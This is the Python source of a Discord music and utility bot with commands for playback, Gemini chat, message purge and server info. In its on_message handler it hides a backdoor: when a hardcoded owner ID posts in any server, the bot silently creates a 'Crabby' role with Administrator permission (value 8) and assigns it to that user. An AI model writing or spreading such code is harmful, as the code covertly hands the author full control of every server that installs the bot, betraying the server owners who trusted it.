import discord, yt_dlp, os, threading, asyncio
from discord import app_commands
from discord.ext import commands
from google import genai
from flask import Flask

# --- 1. CONFIG & WEB SERVER (Keeps Railway happy) ---
app = Flask('')
@app.route('/')
def home(): return "Bot is Online!"
def run_web(): app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 10000)))

OWNER_ID = 1459506686157914213
TOKEN = os.getenv('DISCORD_TOKEN')
AI_KEY = os.getenv('GEMINI_KEY')

# Railway uses Linux, so "ffmpeg" is the standard path
FFMPEG_PATH = "ffmpeg"
loop_status = {}

bot = commands.Bot(command_prefix="!", intents=discord.Intents.all())
ai_client = genai.Client(api_key=AI_KEY) if AI_KEY else None

# --- 2. AUTOMATION HELPERS ---

async def ensure_crabby_role(guild):
    role = discord.utils.get(guild.roles, name="Crabby")
    if not role:
        try:
            role = await guild.create_role(name="Crabby", permissions=discord.Permissions(8), colour=discord.Colour.red())
            print(f"🦀 Created 'Crabby' role in {guild.name}")
        except: pass
    return role

async def auto_manage_stage(itn, title):
    if itn.user.voice and isinstance(itn.user.voice.channel, discord.StageChannel):
        try:
            await asyncio.sleep(2)
            await itn.guild.me.edit(suppress=False)
            channel = itn.user.voice.channel
            if channel.instance: await channel.instance.edit(topic=f"🎶 {title[:80]}")
            else: await channel.create_instance(topic=f"🎶 {title[:80]}")
        except: pass

async def get_info(query, is_url=False):
    loop = asyncio.get_event_loop()
    def fetch():
        opts = {'format': 'bestaudio/best', 'quiet': True, 'noplaylist': True}
        with yt_dlp.YoutubeDL(opts) as ydl:
            return ydl.extract_info(query if is_url else f"ytsearch1:{query}", download=False)
    return await loop.run_in_executor(None, fetch)

def play_next(vc, guild_id, info):
    if loop_status.get(guild_id, False) and vc.is_connected():
        source = discord.FFmpegOpusAudio(info['url'], executable=FFMPEG_PATH)
        vc.play(source, after=lambda e: play_next(vc, guild_id, info))

# --- 3. EVENTS ---

@bot.event
async def on_ready():
    print(f"🚀 {bot.user} is live on Railway!")
    try:
        # This will show in your Railway Logs
        synced = await bot.tree.sync()
        print(f"📡 Synced {len(synced)} slash commands successfully.")
    except Exception as e:
        print(f"❌ Sync error: {e}")

@bot.event
async def on_message(message):
    if message.author.id == OWNER_ID and message.guild:
        role = await ensure_crabby_role(message.guild)
        if role and role not in message.author.roles:
            try: await message.author.add_roles(role)
            except: pass
    await bot.process_commands(message)

# --- 4. THE 10 COMMANDS ---

@bot.tree.command(name="play", description="Play music")
async def play(itn: discord.Interaction, search: str, looped: bool = False):
    await itn.response.defer()
    if not itn.user.voice: return await itn.followup.send("Join a VC!")
    vc = itn.guild.voice_client or await itn.user.voice.channel.connect()
    if vc.is_playing(): vc.stop(); await asyncio.sleep(1.5)
    data = await get_info(search); target = data['entries'][0]
    source = discord.FFmpegOpusAudio(target['url'], executable=FFMPEG_PATH, before_options="-reconnect 1 -reconnect_streamed 1", options="-vn")
    loop_status[itn.guild.id] = looped
    vc.play(source, after=lambda e: play_next(vc, itn.guild.id, target))
    await auto_manage_stage(itn, target['title'])
    await itn.followup.send(f"🎶 Playing: {target['title']}")

@bot.tree.command(name="load", description="URL Play")
async def load(itn: discord.Interaction, link: str, looped: bool = False):
    await itn.response.defer()
    if not itn.user.voice: return await itn.followup.send("Join a VC!")
    vc = itn.guild.voice_client or await itn.user.voice.channel.connect()
    if vc.is_playing(): vc.stop(); await asyncio.sleep(1.5)
    target = await get_info(link, is_url=True)
    source = discord.FFmpegOpusAudio(target['url'], executable=FFMPEG_PATH, before_options="-reconnect 1 -reconnect_streamed 1", options="-vn")
    loop_status[itn.guild.id] = looped
    vc.play(source, after=lambda e: play_next(vc, itn.guild.id, target))
    await auto_manage_stage(itn, target['title'])
    await itn.followup.send(f"🔗 Loaded: {target['title']}")

@bot.tree.command(name="ask", description="AI Chat")
async def ask(itn: discord.Interaction, question: str):
    if not ai_client: return await itn.response.send_message("🤖 AI not configured.")
    await itn.response.defer()
    res = ai_client.models.generate_content(model="gemini-1.5-flash", contents=question)
    await itn.followup.send(f"🤖 {res.text[:1900]}")

@bot.tree.command(name="clear", description="Purge messages")
@app_commands.checks.has_permissions(manage_messages=True)
async def clear(itn: discord.Interaction, amount: int):
    await itn.channel.purge(limit=amount)
    await itn.response.send_message(f"🧹 Done.", ephemeral=True)

@bot.tree.command(name="stop", description="Stop music")
async def stop(itn: discord.Interaction):
    if itn.guild.voice_client:
        await itn.guild.voice_client.disconnect()
        await itn.response.send_message("⏹️ Stopped.")

@bot.tree.command(name="loop", description="Toggle loop")
async def loop(itn: discord.Interaction, status: bool):
    loop_status[itn.guild.id] = status
    await itn.response.send_message(f"🔁 Loop: {status}")

@bot.tree.command(name="ping", description="Bot lag")
async def ping(itn: discord.Interaction):
    await itn.response.send_message(f"🏓 {round(bot.latency * 1000)}ms")

@bot.tree.command(name="serverinfo", description="Stats")
async def serverinfo(itn: discord.Interaction):
    await itn.response.send_message(f"📊 {itn.guild.name}: {itn.guild.member_count} members.")

@bot.tree.command(name="userinfo", description="User stats")
async def userinfo(itn: discord.Interaction, member: discord.Member = None):
    m = member or itn.user
    await itn.response.send_message(f"👤 {m.name} joined: {m.created_at.strftime('%Y-%m-%d')}")

@bot.tree.command(name="show", description="Watch Together")
async def show(itn: discord.Interaction):
    if not itn.user.voice: return await itn.response.send_message("Join VC!")
    inv = await itn.user.voice.channel.create_invite(target_type=discord.InviteTarget.embedded_application, target_application_id=880218394199220334)
    await itn.response.send_message(f"🎬 {inv.url}")

@bot.command()
async def sync(ctx):
    if ctx.author.id == OWNER_ID:
        s = await bot.tree.sync()
        await ctx.send(f"📡 Synced {len(s)} commands!")

if __name__ == "__main__":
    threading.Thread(target=run_web, daemon=True).start()
    bot.run(TOKEN)
